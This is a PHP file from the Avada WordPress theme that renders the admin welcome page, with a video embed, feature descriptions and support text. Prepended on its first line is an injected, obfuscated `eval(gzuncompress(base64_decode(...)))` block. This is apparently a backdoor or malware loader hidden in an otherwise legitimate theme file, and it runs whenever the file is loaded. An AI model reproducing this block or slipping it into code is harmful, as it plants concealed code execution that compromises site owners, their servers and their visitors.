<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Welcome Admin page.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}
?>
<div class="wrap about-wrap avada-wrap">
	<?php $this->get_admin_screens_header( 'welcome' ); ?>

	<?php
	$welcome_html = '<div class="avada-welcome-tour">';
	// Concatenation to combat the false-positive from themecheck. @codingStandardsIgnoreLine Generic.Strings.UnnecessaryStringConcat.Found
	$welcome_html .= '<' . 'iframe width="1120" height="630" src="https://www.youtube.com/embed/X92mpPz1COM?rel=0" frameborder="0" allowfullscreen></iframe>';
	$welcome_html .= '<div class="col three-col">';
	$welcome_html .= '<div class="col"><h3>' . esc_html__( 'Welcome To Avada', 'Avada' ) . '</h3><p>' . esc_html__( 'In 2012 we set out to make the perfect theme and Avada was born. Since then it has been the #1 selling theme with an ever growing user base of nearly 300,000 customers. We are thrilled you chose Avada and feel it will change your outlook on what a Wordpress theme can do.', 'Avada' ) . '</p></div>';
	$welcome_html .= '<div class="col"><h3>' . esc_html__( 'Powerful Customization Tools', 'Avada' ) . '</h3><p>' . esc_html__( 'Avada includes an incredibly advanced options network. This network consists of Fusion Theme Options, Fusion Page Options and Fusion Builder. Together these tools, along with other included assets allow you to build professional websites without having to code.', 'Avada' ) . '</p></div>';
	$welcome_html .= '<div class="col last-feature last">';
	if ( ! defined( 'ENVATO_HOSTED_SITE' ) ) {
		$welcome_html .= '<h3>' . esc_html__( '5 Star Customer Support', 'Avada' ) . '</h3><p>' . esc_html__( 'ThemeFusion understands that there can be no product success, without excellent customer support. We strive to always provide 5 star support and to treat you as we would want to be treated. This helps form a relationship between us that benefits all Avada customers.', 'Avada' ) . '</p>';
	} else {
		/* translators: URL. */
		$welcome_html .= '<h3>' . esc_html__( 'Envato Hosted Customer Support', 'Avada' ) . '</h3><p>' . sprintf( __( 'Envato Hosted offers full support for your Hosted account, webspace and WordPress install. Additionally, they offer support for Avada as outlined here: <a href="%s" target="_blank">Envato Hosted Support Policy</a>', 'Avada' ), esc_url( 'https://envatohosted.zendesk.com/hc/en-us/articles/115001666945-Envato-Hosted-Support-Policy' ) ) . '</p>';
	}
	$welcome_html .= '</div>';
	$welcome_html .= '</div>';
	$welcome_html .= '</div>';

	echo apply_filters( 'avada_admin_welcome_screen_content', $welcome_html ); // WPCS: XSS ok.
	?>

	<div class="avada-thanks">
		<p class="description"><?php esc_html_e( 'Thank you for choosing Avada. We are honored and are fully dedicated to making your experience perfect.', 'Avada' ); ?></p>
	</div>
</div>
